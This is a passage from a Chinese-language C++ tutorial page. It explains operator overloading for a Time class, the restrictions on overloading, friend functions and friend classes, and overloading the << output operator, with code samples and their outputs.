显示总时间</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total time = &quot;</span>;</span><br><span class="line">    total.Show();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和运行:</strong><br>(需要将 <code>main.cpp</code> 和 <code>time.cpp</code> 一起编译链接)</p><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Planning time &#x3D; 2 hours, 40 minutes</span><br><span class="line">Coding time &#x3D; 5 hours, 55 minutes</span><br><span class="line">Calculating total time...</span><br><span class="line">Total time &#x3D; 10 hours, 5 minutes</span><br></pre></td></tr></table></figure><p>可以看到，通过重载 <code>+</code> 运算符，我们可以用非常自然的方式将 <code>Time</code> 对象相加。</p><h3 id="11-2-2-重载限制"><a href="#11-2-2-重载限制" class="headerlink" title="11.2.2 重载限制"></a>11.2.2 重载限制</h3><p>重载运算符时必须遵守一些规则和限制：</p><ol><li> <strong>不能创建新运算符:</strong> 只能重载 C++ 已有的运算符。</li><li> <strong>不能改变运算符优先级和结合性:</strong> <code>*</code> 总是优先于 <code>+</code>。</li><li> <strong>不能改变运算符操作数个数:</strong> 二元运算符（如 <code>+</code>）必须接受两个操作数，一元运算符（如 <code>-</code> (负号)）必须接受一个操作数。</li><li> <strong>至少一个操作数是用户定义类型:</strong> 不能为两个 <code>int</code> 重载 <code>+</code> 运算符。重载必须涉及至少一个类对象（或枚举）。</li><li> <strong>特定运算符不能重载:</strong> 如 <code>.</code>、<code>::</code>、<code>sizeof</code>、<code>?:</code> 等。</li><li> <strong>保持直观性:</strong> 重载应该符合运算符的通常含义。例如，用 <code>+</code> 来表示两个对象的相减会非常令人困惑。虽然语法上允许，但这是不良实践。</li></ol><h3 id="11-2-3-其他重载运算符"><a href="#11-2-3-其他重载运算符" class="headerlink" title="11.2.3 其他重载运算符"></a>11.2.3 其他重载运算符</h3><p>我们可以为 <code>Time</code> 类重载更多的运算符，使其功能更完善。</p><p><strong>重载减法运算符 (<code>-</code>) 作为成员函数:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.h</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... existing members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... existing methods ...</span></span><br><span class="line">    Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">    <span class="comment">// 声明重载减法运算符 (-)</span></span><br><span class="line">    Time <span class="keyword">operator</span>-(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.cpp</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义重载的减法运算符</span></span><br><span class="line">Time Time::<span class="keyword">operator</span>-(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span> &#123;</span><br><span class="line">    Time diff;</span><br><span class="line">    <span class="keyword">int</span> tot1, tot2;</span><br><span class="line">    <span class="comment">// 将时间都转换为总分钟数进行计算</span></span><br><span class="line">    tot1 = t.minutes + <span class="number">60</span> * t.hours;</span><br><span class="line">    tot2 = minutes + <span class="number">60</span> * hours;</span><br><span class="line">    <span class="comment">// 确保结果非负 (简单处理，实际可能需要更复杂的逻辑)</span></span><br><span class="line">    <span class="keyword">if</span> (tot2 &lt; tot1) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Warning: subtraction result is negative. Resetting to 0.\n&quot;</span>;</span><br><span class="line">        diff.hours = diff.minutes = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        diff.minutes = (tot2 - tot1) % <span class="number">60</span>;</span><br><span class="line">        diff.hours = (tot2 - tot1) / <span class="number">60</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> diff;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>重载乘法运算符 (<code>*</code>) - 时间乘以一个因子:</strong></p><p>假设我们想计算 <code>Time</code> 对象乘以一个 <code>double</code> 因子（例如，将时间放大 1.5 倍）。这个运算符的操作数类型不同（<code>Time</code> 和 <code>double</code>），可以作为成员函数或非成员函数实现。这里我们作为成员函数实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.h</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... existing members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... existing methods ...</span></span><br><span class="line">    Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">    Time <span class="keyword">operator</span>-(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">    <span class="comment">// 声明重载乘法运算符 (*)</span></span><br><span class="line">    Time <span class="keyword">operator</span>*(<span class="keyword">double</span> mult) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.cpp</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义重载的乘法运算符</span></span><br><span class="line">Time Time::<span class="keyword">operator</span>*(<span class="keyword">double</span> mult) <span class="keyword">const</span> &#123;</span><br><span class="line">    Time result;</span><br><span class="line">    <span class="comment">// 将时间转换为总分钟数，乘以因子，然后转换回小时和分钟</span></span><br><span class="line">    <span class="keyword">long</span> totalminutes = hours * <span class="number">60</span> + minutes;</span><br><span class="line">    totalminutes *= mult; <span class="comment">// 乘以因子</span></span><br><span class="line">    result.hours = totalminutes / <span class="number">60</span>;</span><br><span class="line">    result.minutes = totalminutes % <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp (续)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Time <span class="title">t1</span><span class="params">(<span class="number">2</span>, <span class="number">30</span>)</span></span>; <span class="comment">// 2 hours, 30 minutes</span></span><br><span class="line">    <span class="function">Time <span class="title">t2</span><span class="params">(<span class="number">1</span>, <span class="number">45</span>)</span></span>; <span class="comment">// 1 hours, 45 minutes</span></span><br><span class="line">    Time diff, product;</span><br><span class="line">    <span class="keyword">double</span> factor = <span class="number">1.5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;t1 = &quot;</span>; t1.Show(); <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;t2 = &quot;</span>; t2.Show(); <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    diff = t1 - t2; <span class="comment">// 使用重载的 -</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;t1 - t2 = &quot;</span>; diff.Show(); <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    product = t1 * factor; <span class="comment">// 使用重载的 *</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;t1 * &quot;</span> &lt;&lt; factor &lt;&lt; <span class="string">&quot; = &quot;</span>; product.Show(); <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注意：我们没有定义 double * Time，所以下面的写法会报错</span></span><br><span class="line">    <span class="comment">// product = factor * t1; // 错误! 需要非成员函数或转换函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出 (续):</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t1 &#x3D; 2 hours, 30 minutes</span><br><span class="line">t2 &#x3D; 1 hours, 45 minutes</span><br><span class="line">t1 - t2 &#x3D; 0 hours, 45 minutes</span><br><span class="line">t1 * 1.5 &#x3D; 3 hours, 45 minutes</span><br></pre></td></tr></table></figure><p>这个例子展示了如何通过重载运算符，让自定义的 <code>Time</code> 类能够以更自然、更符合数学直觉的方式进行运算。下一节将讨论友元函数，特别是如何使用友元函数来重载像 <code>&lt;&lt;</code> 这样的输出运算符，以及处理像 <code>double * Time</code> 这样的运算顺序问题。</p><h2 id="11-3-友元"><a href="#11-3-友元" class="headerlink" title="11.3 友元"></a>11.3 友元</h2><p>通常，类的私有成员（<code>private</code>）只能被该类的成员函数访问。这是 C++ 实现封装和数据隐藏的关键机制。然而，在某些特殊情况下，允许特定的<strong>非成员函数</strong>或<strong>其他类</strong>访问一个类的私有成员会非常方便。C++ 提供了<strong>友元 (friend)</strong> 机制来实现这种受控的访问。</p><p><strong>什么是友元？</strong></p><p>友元是 C++ 中的一种机制，它允许一个类授予<strong>非成员函数</strong>或<strong>另一个类</strong>访问其 <code>private</code> 和 <code>protected</code> 成员的权限。被授予权限的函数或类被称为该类的<strong>友元</strong>。</p><p><strong>注意:</strong> 友元关系是<strong>单向的</strong>，并且<strong>不能被继承</strong>。如果类 <code>A</code> 将函数 <code>func()</code> 声明为友元，<code>func()</code> 可以访问 <code>A</code> 的私有成员，但这并不意味着 <code>A</code> 可以访问 <code>func()</code> 的内部（如果 <code>func</code> 是另一个类的成员），也不意味着 <code>A</code> 的派生类会自动将 <code>func()</code> 视为友元。</p><h3 id="11-3-1-创建友元"><a href="#11-3-1-创建友元" class="headerlink" title="11.3.1 创建友元"></a>11.3.1 创建友元</h3><p>要将一个函数或另一个类声明为当前类的友元，需要在<strong>当前类的定义内部</strong>使用 <code>friend</code> 关键字进行声明。</p><p><strong>1. 友元函数 (Friend Function):</strong></p><p>友元函数可以是普通的非成员函数，也可以是另一个类的成员函数。</p><ul><li><p><strong>声明普通非成员函数为友元:</strong></p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> secret;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass(<span class="keyword">int</span> s = <span class="number">0</span>) : secret(s) &#123;&#125;</span><br><span class="line">    <span class="comment">// 在类定义内部声明友元函数</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">showSecret</span><span class="params">(<span class="keyword">const</span> MyClass&amp; obj)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义友元函数 (注意：它不是成员函数，没有 MyClass::)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showSecret</span><span class="params">(<span class="keyword">const</span> MyClass&amp; obj)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 因为是 MyClass 的友元，所以可以访问其私有成员 secret</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The secret is: &quot;</span> &lt;&lt; obj.secret &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">MyClass <span class="title">myObj</span><span class="params">(<span class="number">42</span>)</span></span>;</span><br><span class="line">    showSecret(myObj); <span class="comment">// 调用友元函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>声明另一个类的成员函数为友元:</strong> (需要注意声明顺序和前向声明)</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前向声明 ClassB，因为 ClassA 的友元声明中用到了它</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> dataA;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ClassA(<span class="keyword">int</span> d = <span class="number">0</span>) : dataA(d) &#123;&#125;</span><br><span class="line">    <span class="comment">// 声明 ClassB 的成员函数 memberB 为友元</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">ClassB::memberB</span><span class="params">(<span class="keyword">const</span> ClassA&amp; a)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ClassB 的成员函数，它将是 ClassA 的友元</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">memberB</span><span class="params">(<span class="keyword">const</span> ClassA&amp; a)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 ClassB::memberB</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClassB::memberB</span><span class="params">(<span class="keyword">const</span> ClassA&amp; a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可以访问 ClassA 的私有成员 dataA</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accessing ClassA data from ClassB: &quot;</span> &lt;&lt; a.dataA &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">ClassA <span class="title">objA</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">    ClassB objB;</span><br><span class="line">    objB.memberB(objA); <span class="comment">// 调用 ClassB 的成员函数，该函数是 ClassA 的友元</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>2. 友元类 (Friend Class):</strong></p><p>一个类可以将另一个<strong>整个类</strong>声明为友元。这样，友元类的<strong>所有成员函数</strong>都可以访问声明它为友元的那个类的 <code>private</code> 和 <code>protected</code> 成员。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Storage</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Controller</span>;</span> <span class="comment">// 声明 Controller 为友元类</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Storage(<span class="keyword">int</span> v = <span class="number">0</span>) : value(v) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Controller</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">manipulateStorage</span><span class="params">(Storage&amp; s, <span class="keyword">int</span> newValue)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 因为 Controller 是 Storage 的友元，可以访问其私有成员 value</span></span><br><span class="line">        s.value = newValue;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Storage value changed to: &quot;</span> &lt;&lt; s.value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Storage <span class="title">myStorage</span><span class="params">(<span class="number">5</span>)</span></span>;</span><br><span class="line">    Controller myController;</span><br><span class="line">    myController.manipulateStorage(myStorage, <span class="number">99</span>); <span class="comment">// Controller 的方法可以修改 Storage 的私有数据</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-3-2-常用的友元：重载-lt-lt-运算符"><a href="#11-3-2-常用的友元：重载-lt-lt-运算符" class="headerlink" title="11.3.2 常用的友元：重载 &lt;&lt; 运算符"></a>11.3.2 常用的友元：重载 <code>&lt;&lt;</code> 运算符</h3><p>运算符重载最常见的应用之一就是重载**输出运算符 <code>&lt;&lt;</code>**，以便能够直接使用 <code>cout</code> 来打印对象的信息，例如 <code>cout &lt;&lt; myTimeObject;</code>。</p><p><strong>为什么通常需要友元？</strong></p><p>考虑 <code>cout &lt;&lt; myTimeObject;</code> 这个表达式。</p><ul><li>  它实际上是调用一个形式为 <code>operator&lt;&lt;(cout, myTimeObject)</code> 的函数。</li><li>  这个运算符的<strong>左操作数</strong>是 <code>cout</code>（一个 <code>ostream</code> 类型的对象），<strong>右操作数</strong>是我们要打印的对象（比如 <code>Time</code> 类型的对象）。</li></ul><p>如果我们尝试将 <code>operator&lt;&lt;</code> 定义为 <code>Time</code> 类的<strong>成员函数</strong>，那么它的调用形式会是 <code>myTimeObject.operator&lt;&lt;(cout)</code>。这意味着 <code>myTimeObject</code> 必须是左操作数，而 <code>cout</code> 是右操作数，即 <code>myTimeObject &lt;&lt; cout</code>。这显然不符合我们习惯的用法。</p><p>因此，<code>operator&lt;&lt;</code> 必须被重载为<strong>非成员函数</strong>。但是，这个非成员函数通常需要访问类的私有数据成员（如 <code>Time</code> 类的 <code>hours</code> 和 <code>minutes</code>）来打印它们。这就使得将 <code>operator&lt;&lt;</code> 声明为类的<strong>友元函数</strong>成为最自然、最常用的解决方案。</p><p><strong>为 <code>Time</code> 类重载 <code>&lt;&lt;</code>:</strong></p><ol><li><p><strong>在 <code>time.h</code> 中声明友元函数:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.h</span></span><br><span class="line"><span class="comment">// ... (包含 guards 和 iostream) ...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... constructors and other methods ...</span></span><br><span class="line">    Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">    Time <span class="keyword">operator</span>-(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">    Time <span class="keyword">operator</span>*(<span class="keyword">double</span> mult) <span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明友元函数 operator&lt;&lt;</span></span><br><span class="line">    <span class="comment">// 第一个参数是 ostream 对象的引用 (如 cout)</span></span><br><span class="line">    <span class="comment">// 第二个参数是要打印的 Time 对象的 const 引用</span></span><br><span class="line">    <span class="comment">// 返回 ostream 对象的引用，以支持链式输出 (cout &lt;&lt; t1 &lt;&lt; t2)</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Time &amp; t);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不再需要 Show() 方法，因为 &lt;&lt; 提供了更好的方式</span></span><br><span class="line">    <span class="comment">// void Show() const;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (endif) ...</span></span><br></pre></td></tr></table></figure></li><li><p><strong>在 <code>time.cpp</code> 中定义友元函数:</strong> (注意：没有 <code>Time::</code> 前缀)</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span> <span class="comment">// 确保包含了 time.h</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (构造函数和其他方法的定义) ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义友元函数 operator&lt;&lt;</span></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Time &amp; t) &#123;</span><br><span class="line">    <span class="comment">// 因为是友元，可以访问 t 的私有成员 hours 和 minutes</span></span><br><span class="line">    os &lt;&lt; t.hours &lt;&lt; <span class="string">&quot; hours, &quot;</span> &lt;&lt; t.minutes &lt;&lt; <span class="string">&quot; minutes&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os; <span class="comment">// 返回 ostream 引用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果删除了 Show()，需要移除它的定义</span></span><br><span class="line"><span class="comment">// void Time::Show() const &#123; ... &#125;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>使用重载的 <code>&lt;&lt;</code>:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp -- 使用重载的 &lt;&lt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Time <span class="title">t1</span><span class="params">(<span class="number">3</span>, <span class="number">45</span>)</span></span>;</span><br><span class="line">    <span class="function">Time <span class="title">t2</span><span class="params">(<span class="number">2</span>, <span class="number">15</span>)</span></span>;</span><br><span class="line">    Time sum = t1 + t2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用重载的 &lt;&lt; 运算符输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Time t1: &quot;</span> &lt;&lt; t1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Time t2: &quot;</span> &lt;&lt; t2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span 